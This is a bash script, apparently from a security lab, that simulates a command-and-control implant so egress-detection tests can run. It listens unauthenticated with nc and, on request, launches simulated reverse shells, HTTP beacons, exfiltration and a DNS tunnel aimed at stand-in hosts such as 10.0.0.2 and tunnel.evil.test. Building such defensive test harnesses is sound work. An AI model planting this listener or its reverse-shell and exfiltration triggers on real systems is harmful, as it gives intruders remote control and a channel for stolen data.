#!/bin/bash
# ============================================================================
#  C2 IMPLANT TRIGGER  (scenario #4 — egress / C2 detection)
# ----------------------------------------------------------------------------
#  Models an implant ALREADY resident on the box, so the egress / C2-detection
#  test can be driven WITHOUT first popping a shell (vsftpd, ActiveMQ, SSH, ...).
#  Egress detection is about OUTBOUND traffic — orthogonal to how you got in —
#  so the test shouldn't be coupled to any single foothold working.
#
#  Listens on TCP <port> (default 9001). Each connection sends one request line:
#       <mode> <lhost> <arg>
#  e.g.  "revshell 10.0.0.2 4444"
#        "http-beacon 10.0.0.2 80"
#        "exfil 10.0.0.2 80"
#        "dns-tunnel 10.0.0.2 tunnel.evil.test"
#  …and the trigger runs c2-sim with it. Long-running modes are time-boxed so
#  the implant doesn't beacon forever after a single poke.
#
#  Intentionally unauthenticated — isolated lab use only.
# ============================================================================

PORT="${1:-9001}"
BEACON_MAX="${C2_BEACON_SECONDS:-30}"   # cap http-beacon / dns-tunnel runtime

echo "[*] c2-trigger listening on tcp/${PORT}  (send: '<mode> <lhost> <arg>')"

while true; do
    # openbsd nc: -l listens and exits after one connection; $(...) captures the
    # request line and returns once the client half-closes (EOF).
    req="$(nc -l "${PORT}" 2>/dev/null)"
    [ -z "${req}" ] && continue

    # shellcheck disable=SC2086
    set -- ${req}
    mode="$1"; lhost="$2"; arg="$3"
    if [ -z "${mode}" ] || [ -z "${lhost}" ]; then
        continue
    fi
    echo "[c2-trigger] $(date '+%T') -> c2-sim ${mode} ${lhost} ${arg}"

    case "${mode}" in
        revshell)
            c2-sim revshell "${lhost}" "${arg}" >/dev/null 2>&1 &
            ;;
        http-beacon)
            timeout "${BEACON_MAX}" c2-sim http-beacon "${lhost}" "${arg}" >/dev/null 2>&1 &
            ;;
        exfil)
            c2-sim exfil "${lhost}" "${arg}" >/dev/null 2>&1 &
            ;;
        dns-tunnel)
            timeout "${BEACON_MAX}" c2-sim dns-tunnel "${lhost}" "${arg:-tunnel.evil.test}" >/dev/null 2>&1 &
            ;;
        *)
            echo "[c2-trigger] unknown mode: ${mode}"
            ;;
    esac
done
